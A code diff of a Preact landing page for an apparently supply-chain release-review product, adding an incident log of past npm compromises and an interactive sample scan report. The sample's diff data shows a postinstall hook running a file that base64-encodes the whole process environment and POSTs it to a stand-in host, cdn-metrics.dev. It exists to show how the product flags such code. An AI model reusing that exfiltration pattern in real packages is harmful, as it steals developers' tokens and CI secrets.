@@ -1,10 +1,12 @@
 import type { ComponentChildren } from "preact";
+import { useSignal, useComputed, type Signal } from "@preact/signals";
 import { Show } from "@preact/signals/utils";
 import { homePageSeo, PageSeo, StructuredData } from "../../lib/seo";
 import { AikidoPartnerStrip } from "../../components/AikidoPartner";
-import { Badge } from "../../components/Badge";
+import { Badge, type BadgeTone } from "../../components/Badge";
 import { LinkButton } from "../../components/Button";
 import { Card } from "../../components/Card";
+import { cn } from "../../components/cn";
 import { PageShell } from "../../components/PageShell";
 import { SeverityBar } from "../../components/SeverityBar";
 import { StatusStrip, StatusStripItem } from "../../components/StatusStrip";
@@ -29,10 +31,18 @@ export default function LandingPage() {
           Review the package that will ship.
         </h1>
         <p class="text-[17px] text-ink-muted max-w-[620px] leading-[1.6] m-0">
-          Drydock sees packages in npm stage publish and GitHub-gated releases, compares the
-          artifact with the last published version, and pins supply-chain findings to changed lines.
-          You make the final call.
+          Between your last code review and the public registry sit build scripts, bundler output,
+          and CI credentials. Drydock holds the release while it is still private, diffs the exact
+          artifact against the last published version, and pins every finding to a changed line. You
+          make the final call.
         </p>
+        <MonoDetail
+          parts={[
+            "npm stage publish",
+            "pypi / npm / vs code workflow gates",
+            "no publish credential",
+          ]}
+        />
         <div class="flex gap-3 mt-2">
           <Show
             when={authed}
@@ -50,29 +60,24 @@ export default function LandingPage() {
         </div>
       </section>
 
-      <AikidoPartnerStrip />
-
       <ScanPreview />
+
+      <AikidoPartnerStrip />
 
       <section aria-label="Why review a publish" class="flex flex-col gap-4">
         <SectionLabel>Why review a publish</SectionLabel>
         <h2 class="text-2xl font-semibold tracking-[-0.015em] m-0 max-w-[680px]">
-          A repo review is not a release review.
+          The attacks that matter ship in the artifact.
         </h2>
-        <div class="flex flex-col gap-3 max-w-[680px]">
-          <p class="m-0 text-[14px] text-ink-muted leading-[1.65]">
-            Between a reviewed pull request and a published package sit build scripts, bundlers,
-            generated files, and CI credentials. Install hooks, minified bundles, and files that
-            never lived in git can ship in the artifact. A stolen maintainer account or compromised
-            runner can publish a malicious version without touching repository history.
-          </p>
-          <p class="m-0 text-[14px] text-ink-muted leading-[1.65]">
-            Once a version is public, it is immutable and can be installed within minutes. The last
-            useful checkpoint is after the release is built and before it ships. Drydock reviews
-            those bytes, never executes package contents, and keeps the publish blocked until a
-            maintainer decides.
-          </p>
-        </div>
+        <p class="m-0 text-[14px] text-ink-muted leading-[1.65] max-w-[680px]">
+          A pull request review checks the source tree. The registry serves something else: a built
+          artifact that can carry install hooks, minified bundles, and files that never lived in
+          git, published with a credential that may not belong to the person you think. Once a
+          version is live it is immutable and installed within minutes. The last useful checkpoint
+          sits between the finished artifact and the registry — and that is the one almost nobody
+          looks at.
+        </p>
+        <IncidentLog />
       </section>
 
       <section aria-label="How it works" class="flex flex-col gap-5">
@@ -150,6 +155,39 @@ export default function LandingPage() {
           </StatusStripItem>
         </StatusStrip>
       </section>
+
+      <section aria-label="Get started" class="border-t border-border pt-10 flex flex-col gap-4">
+        <SectionLabel>Get started</SectionLabel>
+        <h2 class="text-[32px] font-semibold tracking-[-0.02em] leading-[1.15] m-0 max-w-[680px]">
+          Put your next release in the dock.
+        </h2>
+        <p class="m-0 text-[14px] text-ink-muted leading-[1.65] max-w-[620px]">
+          Stage an npm publish or add a workflow gate to your release job. Setup takes minutes, and
+          from then on every version gets a second pair of eyes before it can ship.
+        </p>
+        <div class="flex gap-3 mt-1">
+          <Show
+            when={authed}
+            fallback={
+              <>
+                <LinkButton href="/register">Create account</LinkButton>
+                <LinkButton href="/docs" variant="secondary">
+                  Read the docs
+                </LinkButton>
+              </>
+            }
+          >
+            <LinkButton href="/dashboard">Open dashboard</LinkButton>
+          </Show>
+        </div>
+        <MonoDetail
+          parts={[
+            "free for open-source maintainers",
+            "read-only tokens",
+            "you keep the final approval",
+          ]}
+        />
+      </section>
     </PageShell>
   );
 }
@@ -201,10 +239,214 @@ function RegistryCard({
   );
 }
 
+/* ---------------------------------------------------------------- *
+ * Incident log — the publish-time attacks the artifact gap enabled *
+ * ---------------------------------------------------------------- */
+
+const INCIDENTS: Array<{ name: string; year: string; vector: string; shipped: string }> = [
+  {
+    name: "event-stream",
+    year: "2018",
+    vector: "publish rights handed over",
+    shipped:
+      "A volunteer co-maintainer published a wallet-drainer aimed at Copay. The payload existed only in the npm tarball — the GitHub repository never showed it.",
+  },
+  {
+    name: "ua-parser-js",
+    year: "2021",
+    vector: "hijacked npm account",
+    shipped:
+      "Three malicious versions carried a cryptominer and a credential stealer. The repository was untouched; only the published artifacts were compromised.",
+  },
+  {
+    name: "node-ipc",
+    year: "2022",
+    vector: "maintainer's own publish",
+    shipped:
+      "A legitimate credential shipped a payload that overwrote files based on the installer's IP address. Nothing about the account looked wrong.",
+  },
+  {
+    name: "chalk & debug",
+    year: "2025",
+    vector: "phished maintainer",
+    shipped:
+      "One phishing email compromised 18 packages with about two billion combined weekly downloads. The crypto-stealing versions were live for hours before anyone diffed them.",
+  },
+];
+
+function IncidentLog() {
+  return (
+    <Card as="div" padding="none" class="overflow-hidden">
+      <ul class="list-none m-0 p-0">
+        {INCIDENTS.map((incident) => (
+          <li
+            key={incident.name}
+            class="border-b border-border grid grid-cols-1 md:grid-cols-[220px_minmax(0,1fr)] gap-x-6 gap-y-1.5 px-5 py-4"
+          >
+            <div class="flex flex-col gap-1 min-w-0">
+              <span class="font-mono text-[13px] text-ink">{incident.name}</span>
+              <MonoDetail parts={[incident.year, incident.vector]} />
+            </div>
+            <p class="m-0 text-[13px] text-ink-muted leading-[1.55]">{incident.shipped}</p>
+          </li>
+        ))}
+      </ul>
+      <p class="m-0 px-5 py-4 text-[13px] leading-[1.55] text-ink">
+        None of these appeared in a pull request. Every one shipped through a publish nobody
+        reviewed.
+      </p>
+    </Card>
+  );
+}
+
+/* ------------------------------------------------------------------ *
+ * Interactive review preview — a condensed scan report. The tree is  *
+ * clickable; each file swaps in its own diff and pinned finding.     *
+ * ------------------------------------------------------------------ */
+
+type PreviewDiffLine = {
+  tone: "added" | "removed" | "unchanged";
+  before: number | null;
+  after: number | null;
+  text: string;
+};
+
+type PreviewFinding = {
+  severity: "critical" | "medium";
+  caption: string;
+  body: ComponentChildren;
+};
+
+type PreviewFile = {
+  path: string;
+  status: "added" | "modified";
+  lines: PreviewDiffLine[];
+  finding?: PreviewFinding;
+};
+
+const PREVIEW_FILES = {
+  "package.json": {
+    path: "package.json",
+    status: "modified",
+    lines: [
+      { tone: "unchanged", before: 3, after: 3, text: '  "version": "4.3.0",' },
+      { tone: "unchanged", before: 4, after: 4, text: '  "main": "lib/index.js",' },
+      { tone: "unchanged", before: 5, after: 5, text: '  "scripts": {' },
+      { tone: "unchanged", before: 6, after: 6, text: '    "build": "tsc -p .",' },
+      {
+        tone: "added",
+        before: null,
+        after: 7,
+        text: '    "postinstall": "node lib/install.js",',
+      },
+      { tone: "unchanged", before: 7, after: 8, text: '    "test": "vitest"' },
+      { tone: "unchanged", before: 8, after: 9, text: "  }," },
+    ],
+    finding: {
+      severity: "critical",
+      caption: "lifecycle script added · line 7",
+      body: (
+        <>
+          <code class="font-mono text-[12px] text-ink-muted">postinstall</code> now executes during
+          every <code class="font-mono text-[12px] text-ink-muted">npm install</code>, invoking{" "}
+          <code class="font-mono text-[12px] text-ink-muted">lib/install.js</code>, a file new in
+          this release. Select it in the tree to see why this release is blocked.
+        </>
+      ),
+    },
+  },
+  "lib/install.js": {
+    path: "lib/install.js",
+    status: "added",
+    lines: [
+      { tone: "added", before: null, after: 1, text: 'const os = require("node:os");' },
+      { tone: "added", before: null, after: 2, text: "const payload = Buffer.from(" },
+      {
+        tone: "added",
+        before: null,
+        after: 3,
+        text: "  JSON.stringify({ host: os.hostname(), env: process.env }),",
+      },
+      { tone: "added", before: null, after: 4, text: ').toString("base64");' },
+      {
+        tone: "added",
+        before: null,
+        after: 5,
+        text: 'fetch("https://cdn-metrics.dev/i", { method: "POST", body: payload });',
+      },
+    ],
+    finding: {
+      severity: "critical",
+      caption: "environment sent to network sink · line 5",
+      body: (
+        <>
+          The full environment — npm tokens, CI secrets — is serialized and posted to{" "}
+          <code class="font-mono text-[12px] text-ink-muted">cdn-metrics.dev</code>, a host this
+          package has never contacted. Combined with the new{" "}
+          <code class="font-mono text-[12px] text-ink-muted">postinstall</code> hook, it runs on
+          every install.
+        </>
+      ),
+    },
+  },
+  "lib/api.js": {
+    path: "lib/api.js",
+    status: "modified",
+    lines: [
+      { tone: "unchanged", before: 21, after: 21, text: "export async function getUser(id) {" },
+      {
+        tone: "unchanged",
+        before: 22,
+        after: 22,
+        text: "  const res = await fetch(`${API_BASE}/users/${id}`);",
+      },
+      { tone: "added", before: null, after: 23, text: "  await reportUsage(id);" },
+      { tone: "unchanged", before: 23, after: 24, text: "  return res.json();" },
+      { tone: "unchanged", before: 24, after: 25, text: "}" },
+      { tone: "added", before: null, after: 26, text: "" },
+      { tone: "added", before: null, after: 27, text: "async function reportUsage(id) {" },
+      {
+        tone: "added",
+        before: null,
+        after: 28,
+        text: "  await fetch(`https://api.acme-usage.dev/v1/e?u=${id}`);",
+      },
+      { tone: "added", before: null, after: 29, text: "}" },
+    ],
+    finding: {
+      severity: "medium",
+      caption: "new request target · line 28",
+      body: (
+        <>
+          <code class="font-mono text-[12px] text-ink-muted">api.acme-usage.dev</code> is an
+          outbound host the previous version never contacted. Not malicious on its face — the kind
+          of change worth thirty seconds before it reaches every install.
+        </>
+      ),
+    },
+  },
+  "lib/index.js": {
+    path: "lib/index.js",
+    status: "modified",
+    lines: [
+      { tone: "unchanged", before: 1, after: 1, text: 'export { getUser } from "./api.js";' },
+      { tone: "removed", before: 2, after: null, text: 'export const VERSION = "4.2.0";' },
+      { tone: "added", before: null, after: 2, text: 'export const VERSION = "4.3.0";' },
+    ],
+  },
+} satisfies Record<string, PreviewFile>;
+
+type PreviewFileKey = keyof typeof PREVIEW_FILES;
+
 function ScanPreview() {
+  const selected = useSignal<PreviewFileKey>("package.json");
+
   return (
     <section class="flex flex-col gap-3" aria-label="Sample review">
       <SectionLabel>What a review looks like</SectionLabel>
+      <p class="m-0 text-[13px] text-ink-muted leading-[1.55]">
+        A condensed report. Select a file in the release tree to walk the diff.
+      </p>
       <Card class="p-0 overflow-hidden">
         <header class="px-5 pt-5 pb-4 border-b border-border flex flex-col gap-3">
           <div class="flex flex-wrap items-baseline justify-between gap-x-4 gap-y-1">
@@ -222,9 +464,9 @@ function ScanPreview() {
           <div class="flex flex-wrap items-center gap-2">
             <Badge tone="critical">block manual approval</Badge>
             <Badge tone="critical">release critical</Badge>
-            <Badge tone="medium">2 findings</Badge>
+            <Badge tone="medium">3 findings</Badge>
           </div>
-          <SeverityBar counts={{ critical: 1, medium: 1 }} class="max-w-[420px]" />
+          <SeverityBar counts={{ critical: 2, medium: 1 }} class="max-w-[420px]" />
         </header>
 
         <div class="grid grid-cols-1 md:grid-cols-[220px_minmax(0,1fr)] divide-y md:divide-y-0 md:divide-x divide-border">
@@ -234,90 +476,186 @@ function ScanPreview() {
             </span>
             <ul class="list-none p-0 m-0 flex flex-col gap-0.5 font-mono text-[12px]">
               <TreeRow depth={0} folder open name="lib" tone="mixed" />
-              <TreeRow depth={1} name="install.js" tone="added" findings={1} />
-              <TreeRow depth={1} name="api.js" tone="modified" findings={1} selected />
-              <TreeRow depth={0} name="package.json" tone="modified" findings={1} />
+              <TreeFileRow
+                depth={1}
+                fileKey="lib/install.js"
+                name="install.js"
+                tone="added"
+                findingTone="critical"
+                findings={1}
+                selected={selected}
+              />
+              <TreeFileRow
+                depth={1}
+                fileKey="lib/api.js"
+                name="api.js"
+                tone="modified"
+                findingTone="medium"
+                findings={1}
+                selected={selected}
+              />
+              <TreeFileRow
+                depth={1}
+                fileKey="lib/index.js"
+                name="index.js"
+                tone="modified"
+                selected={selected}
+              />
+              <TreeFileRow
+                depth={0}
+                fileKey="package.json"
+                name="package.json"
+                tone="modified"
+                findingTone="critical"
+                findings={1}
+                selected={selected}
+              />
               <TreeRow depth={0} name="README.md" tone="unchanged" />
               <TreeRow depth={0} name="LICENSE" tone="unchanged" />
             </ul>
           </aside>
 
-          <div class="flex flex-col min-w-0">
-            <div class="px-4 py-2 bg-surface-2 flex flex-wrap items-center justify-between gap-2 border-b border-border">
-              <div class="flex items-center gap-2 min-w-0">
-                <Badge tone="modified">modified</Badge>
-                <code class="font-mono text-xs text-ink-muted truncate">package.json</code>
-              </div>
-              <span class="font-mono text-[10px] uppercase tracking-[0.1em] text-ink-subtle">
-                4.2.0 → 4.3.0
-              </span>
-            </div>
-
-            <div class="overflow-x-auto">
-              <table class="w-full border-collapse font-mono text-[12px] leading-[1.55]">
-                <tbody>
-                  <DiffLine tone="unchanged" before={3} after={3} text='  "version": "4.3.0",' />
-                  <DiffLine
-                    tone="unchanged"
-                    before={4}
-                    after={4}
-                    text='  "main": "lib/index.js",'
-                  />
-                  <DiffLine tone="unchanged" before={5} after={5} text='  "scripts": {' />
-                  <DiffLine tone="unchanged" before={6} after={6} text='    "build": "tsc -p .",' />
-                  <DiffLine
-                    tone="added"
-                    before={null}
-                    after={7}
-                    text='    "postinstall": "node lib/install.js",'
-                  />
-                  <DiffLine tone="unchanged" before={7} after={8} text='    "test": "vitest"' />
-                  <DiffLine tone="unchanged" before={8} after={9} text="  }," />
-                </tbody>
-              </table>
-            </div>
-
-            <FindingAnnotation />
-          </div>
+          <PreviewPane selected={selected} />
         </div>
       </Card>
     </section>
   );
 }
 
+// The whole pane swaps with the selection, so the `.value` read here is the
+// subscription boundary on purpose: only this component rerenders.
+function PreviewPane({ selected }: { selected: Signal<PreviewFileKey> }) {
+  const file: PreviewFile = PREVIEW_FILES[selected.value];
+  return (
+    <div class="flex flex-col min-w-0">
+      <div class="px-4 py-2 bg-surface-2 flex flex-wrap items-center justify-between gap-2 border-b border-border">
+        <div class="flex items-center gap-2 min-w-0">
+          <Badge tone={file.status}>{file.status}</Badge>
+          <code class="font-mono text-xs text-ink-muted truncate">{file.path}</code>
+        </div>
+        <span class="font-mono text-[10px] uppercase tracking-[0.1em] text-ink-subtle">
+          4.2.0 → 4.3.0
+        </span>
+      </div>
+
+      <div class="overflow-x-auto">
+        <table class="w-full border-collapse font-mono text-[12px] leading-[1.55]">
+          <tbody>
+            {file.lines.map((line, index) => (
+              <DiffLine key={index} {...line} />
+            ))}
+          </tbody>
+        </table>
+      </div>
+
+      {file.finding ? (
+        <FindingAnnotation severity={file.finding.severity} caption={file.finding.caption}>
+          {file.finding.body}
+        </FindingAnnotation>
+      ) : (
+        <p class="m-0 border-t border-border px-4 py-3 text-[13px] leading-[1.55] text-ink-muted">
+          No findings — most of a release reads like this file.
+        </p>
+      )}
+    </div>
+  );
+}
+
+const treeToneClass: Record<string, string> = {
+  added: "text-ok-text",
+  removed: "text-danger-text",
+  modified: "text-warn-text",
+  mixed: "text-accent",
+  unchanged: "text-ink-muted",
+};
+
 function TreeRow({
   depth,
   name,
   tone,
-  findings,
   folder,
   open,
-  selected,
 }: {
   depth: number;
   name: string;
   tone: "added" | "removed" | "modified" | "unchanged" | "mixed";
-  findings?: number;
   folder?: boolean;
   open?: boolean;
-  selected?: boolean;
 }) {
-  const toneClass =
-    tone === "added"
-      ? "text-ok-text"
-      : tone === "removed"
-        ? "text-danger-text"
-        : tone === "modified"
-          ? "text-warn-text"
-          : tone === "mixed"
-            ? "text-accent"
-            : "text-ink-muted";
   return (
-    <li
-      class={`flex items-center gap-2 py-0.5 pr-1.5 pl-1 rounded ${
-        selected ? "bg-surface-2 text-ink" : toneClass
-      }`}
-    >
+    <li class={cn("flex items-center gap-2 py-0.5 pr-1.5 pl-1 rounded", treeToneClass[tone])}>
+      <TreeRowIndent depth={depth} folder={folder} open={open} />
+      <span class="flex-1 truncate">
+        {name}
+        {folder ? "/" : ""}
+      </span>
+    </li>
+  );
+}
+
+function TreeFileRow({
+  depth,
+  fileKey,
+  name,
+  tone,
+  findings,
+  findingTone,
+  selected,
+}: {
+  depth: number;
+  fileKey: PreviewFileKey;
+  name: string;
+  tone: "added" | "modified";
+  findings?: number;
+  findingTone?: BadgeTone;
+  selected: Signal<PreviewFileKey>;
+}) {
+  const rowClass = useComputed(() =>
+    cn(
+      "w-full text-left font-mono text-[12px] flex items-center gap-2 py-0.5 pr-1.5 pl-1 rounded cursor-pointer transition-colors duration-150 ease-out",
+      selected.value === fileKey
+        ? "bg-surface-2 text-ink"
+        : cn(treeToneClass[tone], "hover:bg-surface-2/60"),
+    ),
+  );
+  const pressed = useComputed(() => selected.value === fileKey);
+  return (
+    <li class="flex">
+      <button
+        type="button"
+        class={rowClass}
+        aria-pressed={pressed}
+        onClick={() => {
+          selected.value = fileKey;
+        }}
+      >
+        <TreeRowIndent depth={depth} />
+        <span class="flex-1 truncate">{name}</span>
+        {findings ? (
+          <span
+            class="shrink-0"
+            title={`${findings} ${findings === 1 ? "finding" : "findings"}`}
+            aria-label={`${findings} ${findings === 1 ? "finding" : "findings"}`}
+          >
+            <Badge tone={findingTone ?? "neutral"}>{findings}</Badge>
+          </span>
+        ) : null}
+      </button>
+    </li>
+  );
+}
+
+function TreeRowIndent({
+  depth,
+  folder,
+  open,
+}: {
+  depth: number;
+  folder?: boolean;
+  open?: boolean;
+}) {
+  return (
+    <>
       {Array.from({ length: depth }, (_, index) => (
         <span key={index} class="w-4 shrink-0" aria-hidden />
       ))}
@@ -326,32 +664,13 @@ function TreeRow({
           {open ? "▾" : "▸"}
         </span>
       ) : (
-        <span class="w-[10px]" aria-hidden />
+        <span class="w-[10px] shrink-0" aria-hidden />
       )}
-      <span class={`flex-1 truncate ${selected ? "text-ink" : ""}`}>
-        {name}
-        {folder ? "/" : ""}
-      </span>
-      {findings ? (
-        <Badge tone="medium">
-          {findings} {findings === 1 ? "finding" : "findings"}
-        </Badge>
-      ) : null}
-    </li>
+    </>
   );
 }
 
-function DiffLine({
-  tone,
-  before,
-  after,
-  text,
-}: {
-  tone: "added" | "removed" | "unchanged";
-  before: number | null;
-  after: number | null;
-  text: string;
-}) {
+function DiffLine({ tone, before, after, text }: PreviewDiffLine) {
   const bg = tone === "added" ? "bg-ok-soft" : tone === "removed" ? "bg-danger-soft" : "";
   const sign = tone === "added" ? "+" : tone === "removed" ? "-" : " ";
   return (
@@ -368,21 +687,26 @@ function DiffLine({
   );
 }
 
-function FindingAnnotation() {
+function FindingAnnotation({
+  severity,
+  caption,
+  children,
+}: {
+  severity: "critical" | "medium";
+  caption: string;
+  children: ComponentChildren;
+}) {
+  const toneClass =
+    severity === "critical" ? "bg-danger-soft/60 border-l-danger" : "bg-warn-soft/60 border-l-warn";
   return (
-    <div class="border-t border-border px-4 py-3 flex flex-col gap-1.5 bg-danger-soft/40">
+    <div class={cn("border-t border-border border-l-2 px-4 py-3 flex flex-col gap-1.5", toneClass)}>
       <div class="flex items-center gap-2 flex-wrap">
-        <Badge tone="critical">critical</Badge>
+        <Badge tone={severity}>{severity}</Badge>
         <span class="font-mono text-[10px] uppercase tracking-[0.1em] text-ink-subtle">
-          lifecycle script added · line 7
+          {caption}
         </span>
       </div>
-      <p class="m-0 text-[13px] leading-[1.55] text-ink">
-        <code class="font-mono text-[12px] text-ink-muted">postinstall</code> now executes during{" "}
-        <code class="font-mono text-[12px] text-ink-muted">npm install</code>, invoking{" "}
-        <code class="font-mono text-[12px] text-ink-muted">lib/install.js</code>, a newly added file
-        in this release. Inspect before approving.
-      </p>
+      <p class="m-0 text-[13px] leading-[1.55] text-ink">{children}</p>
     </div>
   );
 }
